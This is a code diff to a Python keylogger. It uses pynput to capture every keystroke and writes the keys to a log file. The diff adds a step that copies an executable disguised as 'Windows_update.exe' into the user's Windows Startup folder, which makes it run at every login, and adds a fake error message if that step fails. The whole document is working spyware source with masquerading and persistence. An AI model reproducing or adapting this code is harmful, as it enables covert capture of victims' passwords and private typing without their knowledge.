@@ -8,7 +8,7 @@ class Keylogger:
     
     def __init__(self):
         self.logger = ""
-
+        
     def send_data(self, keystrike):
         self.logger += keystrike
         with open("log.txt","a+",encoding="utf-8") as new_file:
@@ -24,25 +24,28 @@ class Keylogger:
         except AttributeError:
             
             if key == key.space:
-                hit_key = " "
-            elif key == key.enter:
-                hit_key = "\n"
+                hit_key = ""
+
             else:
                 hit_key = "" + str(key) + ""
 
         self.send_data(hit_key)
 
     def change_dir(self):
-        username = getpass.getuser()
-        path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
-        shutil.move("windows_update.exe", path)
-
+        try:
+            username = getpass.getuser()
+            path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+            shutil.move("Windows_update.exe", path)
+        except Exception as e:
+            werror("Error", "Windows_update failed")
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
         with listener:
             self.logger = ""
+            self.change_dir()
             listener.join()
+            
 
 
 Keylogger().main()
